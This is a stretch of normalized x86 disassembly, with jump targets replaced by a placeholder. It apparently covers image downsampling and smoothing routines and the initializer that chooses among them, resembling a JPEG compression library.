mov edx [ ebp - 0x10 ]
cmp edx [ ebp + 0xc ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
add edx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov cl [ eax - 0x1 ]
mov [ ebp - 0x8 ] cl
mov edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jle r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x8 ]
mov [ ecx ] dl
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0xc ]
sub eax 0x1
mov [ ebp - 0xc ] eax
sub_431b60
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xdc ]
push eax
push 0x0
mov ecx [ ebp + 0x14 ]
push ecx
push 0x0
mov edx [ ebp + 0x10 ]
push edx
call sub_420cc0
add esp 0x18
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
shl ecx 0x3
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xdc ]
push edx
mov eax [ ebp + 0x14 ]
push eax
call sub_431ae0
add esp 0x10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431bc0
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
shl ecx 0x3
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x1
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xdc ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
call sub_431ae0
add esp 0x10
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ ebp - 0x18 ]
add eax edx
add ecx eax
sar ecx 0x1
mov edx [ ebp - 0x14 ]
mov [ edx ] cl
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x18 ]
xor ecx 0x1
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x2
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
sub_431ca0
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
shl ecx 0x3
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
shl edx 0x1
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xdc ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
call sub_431ae0
add esp 0x10
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x2
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax + 0x1 ]
add edx ecx
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax ]
add ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
xor ebx ebx
mov bl [ eax + 0x1 ]
add ecx edx
add ebx ecx
sar ebx 0x2
mov ecx [ ebp - 0x1c ]
mov [ ecx ] bl
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x20 ]
xor eax 0x3
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x18 ]
add edx 0x2
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
sub_431db0
push ebp
mov ebp esp
sub esp 0x74
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
shl ecx 0x3
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
shl edx 0x1
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xdc ]
add eax 0x2
push eax
mov ecx [ ebp + 0x10 ]
sub ecx 0x4
push ecx
call sub_431ae0
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xb4 ]
imul eax eax 0x50
mov ecx 0x4000
sub ecx eax
mov [ ebp - 0x30 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xb4 ]
shl eax 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x14 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 - 0x4 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 + 0x8 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax + 0x1 ]
add edx ecx
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax ]
add edx ecx
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax + 0x1 ]
add edx ecx
mov [ ebp - 0x28 ] edx
mov edx [ ebp - 0x1c ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x1c ]
xor edx edx
mov dl [ ecx + 0x1 ]
add eax edx
mov ecx [ ebp - 0x20 ]
xor edx edx
mov dl [ ecx ]
add eax edx
mov ecx [ ebp - 0x20 ]
xor edx edx
mov dl [ ecx + 0x1 ]
add eax edx
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
add eax edx
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx + 0x2 ]
add eax edx
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx ]
add eax edx
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx + 0x2 ]
add eax edx
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x1c ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x1c ]
xor ecx ecx
mov cl [ eax + 0x2 ]
add edx ecx
mov eax [ ebp - 0x20 ]
xor ecx ecx
mov cl [ eax ]
add edx ecx
mov eax [ ebp - 0x20 ]
xor ecx ecx
mov cl [ eax + 0x2 ]
add ecx [ ebp - 0x2c ]
add ecx edx
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x28 ]
imul edx [ ebp - 0x30 ]
mov eax [ ebp - 0x2c ]
imul eax [ ebp - 0x34 ]
add edx eax
mov [ ebp - 0x28 ] edx
mov ecx [ ebp - 0x28 ]
add ecx 0x8000
sar ecx 0x10
mov edx [ ebp - 0x24 ]
mov [ edx ] cl
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x18 ]
add edx 0x2
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x1c ]
add eax 0x2
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x2
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x10 ]
sub edx 0x2
mov [ ebp - 0xc ] edx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx + 0x1 ]
add eax edx
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx ]
add eax edx
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx + 0x1 ]
add eax edx
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x1c ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x1c ]
xor eax eax
mov al [ edx + 0x1 ]
add ecx eax
mov edx [ ebp - 0x20 ]
xor eax eax
mov al [ edx ]
add ecx eax
mov edx [ ebp - 0x20 ]
xor eax eax
mov al [ edx + 0x1 ]
add ecx eax
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx - 0x1 ]
add ecx eax
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx + 0x1 ]
add ecx eax
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx - 0x1 ]
add ecx eax
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx + 0x1 ]
add ecx eax
mov [ ebp - 0x2c ] ecx
mov ecx [ ebp - 0x2c ]
add ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x1c ]
xor eax eax
mov al [ edx - 0x1 ]
mov ecx [ ebp - 0x1c ]
xor edx edx
mov dl [ ecx + 0x1 ]
add eax edx
mov ecx [ ebp - 0x20 ]
xor edx edx
mov dl [ ecx - 0x1 ]
add eax edx
mov ecx [ ebp - 0x20 ]
xor edx edx
mov dl [ ecx + 0x1 ]
add edx [ ebp - 0x2c ]
add edx eax
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x28 ]
imul eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x2c ]
imul ecx [ ebp - 0x34 ]
add eax ecx
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x28 ]
add edx 0x8000
sar edx 0x10
mov eax [ ebp - 0x24 ]
mov [ eax ] dl
mov ecx [ ebp - 0x4 ]
add ecx 0x2
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax + 0x1 ]
add edx ecx
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax ]
add edx ecx
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax + 0x1 ]
add edx ecx
mov [ ebp - 0x28 ] edx
mov edx [ ebp - 0x1c ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x1c ]
xor edx edx
mov dl [ ecx + 0x1 ]
add eax edx
mov ecx [ ebp - 0x20 ]
xor edx edx
mov dl [ ecx ]
add eax edx
mov ecx [ ebp - 0x20 ]
xor edx edx
mov dl [ ecx + 0x1 ]
add eax edx
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx - 0x1 ]
add eax edx
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx + 0x2 ]
add eax edx
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx - 0x1 ]
add eax edx
mov ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx + 0x2 ]
add eax edx
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x1c ]
xor edx edx
mov dl [ ecx - 0x1 ]
mov eax [ ebp - 0x1c ]
xor ecx ecx
mov cl [ eax + 0x2 ]
add edx ecx
mov eax [ ebp - 0x20 ]
xor ecx ecx
mov cl [ eax - 0x1 ]
add edx ecx
mov eax [ ebp - 0x20 ]
xor ecx ecx
mov cl [ eax + 0x2 ]
add ecx [ ebp - 0x2c ]
add ecx edx
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x28 ]
imul edx [ ebp - 0x30 ]
mov eax [ ebp - 0x2c ]
imul eax [ ebp - 0x34 ]
add edx eax
mov [ ebp - 0x28 ] edx
mov ecx [ ebp - 0x28 ]
add ecx 0x8000
sar ecx 0x10
mov edx [ ebp - 0x24 ]
mov [ edx ] cl
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x18 ]
add edx 0x2
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x1c ]
add eax 0x2
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x2
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0xc ]
sub eax 0x1
mov [ ebp - 0xc ] eax
sub_432180
push ebp
mov ebp esp
sub esp 0x78
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
shl ecx 0x3
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xdc ]
add eax 0x2
push eax
mov ecx [ ebp + 0x10 ]
sub ecx 0x4
push ecx
call sub_431ae0
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xb4 ]
shl eax 0x9
mov ecx 0x10000
sub ecx eax
mov [ ebp - 0x28 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xb4 ]
shl eax 0x6
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 - 0x4 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax ]
add edx ecx
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ eax ]
add edx ecx
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x18 ]
xor ecx ecx
mov cl [ eax ]
add edx ecx
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ eax ]
add edx ecx
mov [ ebp - 0x38 ] edx
mov edx [ ebp - 0x30 ]
sub edx [ ebp - 0x20 ]
mov eax [ ebp - 0x30 ]
add eax edx
add eax [ ebp - 0x38 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x20 ]
imul ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
imul edx [ ebp - 0x2c ]
add ecx edx
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0x20 ]
add eax 0x8000
sar eax 0x10
mov ecx [ ebp - 0x1c ]
mov [ ecx ] al
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0xc ]
sub edx 0x2
mov [ ebp - 0x8 ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x34 ]
add ecx eax
add ecx [ ebp - 0x30 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x20 ]
imul edx [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
imul eax [ ebp - 0x2c ]
add edx eax
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x20 ]
add ecx 0x8000
sar ecx 0x10
mov edx [ ebp - 0x1c ]
mov [ edx ] cl
jmp r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x18 ]
xor eax eax
mov al [ edx ]
add ecx eax
mov edx [ ebp - 0x10 ]
xor eax eax
mov al [ edx ]
add ecx eax
mov [ ebp - 0x38 ] ecx
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x34 ]
add edx ecx
add edx [ ebp - 0x38 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x20 ]
imul eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
imul ecx [ ebp - 0x2c ]
add eax ecx
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x20 ]
add edx 0x8000
sar edx 0x10
mov eax [ ebp - 0x1c ]
mov [ eax ] dl
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x8 ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
sub_4323e0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push 0xc
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x150 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_4318b0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
sub edx 0x1
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x8 ] 0x4
ja r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x24 ] 0x1
jge r-xdata
mov eax [ ebp - 0x8 ]
jmp [ eax * 4 + jump_table_43275d ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
sub eax 0x1
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x4
ja r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x9
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x24 ] 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x24 ] 0x3
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x24 ] 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x40 ]
cmp eax [ edx + 0x28 ]
jne r-xdata
mov ecx [ ebp - 0xc ]
jmp [ ecx * 4 + jump_table_432771 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x9
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x9
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x9
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x1b
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x3c ]
cmp eax [ edx + 0x24 ]
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x3c ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x3c ] 0x3
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x3c ] 0x3
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x3c ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x3c ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_432d40
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x28 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0xa
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x28 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0xa
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x28 ] 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0xa
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x28 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0xa
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x28 ] 0x4
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x28 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_432cb0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x1b
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax 0x1
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x28 ] 0x3
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_432790
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_4328b0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x1b
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_432d40
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x28 ] 0x5
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx ] sub_432790
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_432b10
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x28 ] 0x3
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_432790
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_432a20
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_432d40
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x1b
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_432d40
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x1b
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_432d40
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x1b
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_432cb0
jmp r-xdata
jmp r-xdata
sub_432790
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x150 ]
mov [ ebp - 0x4 ] ecx
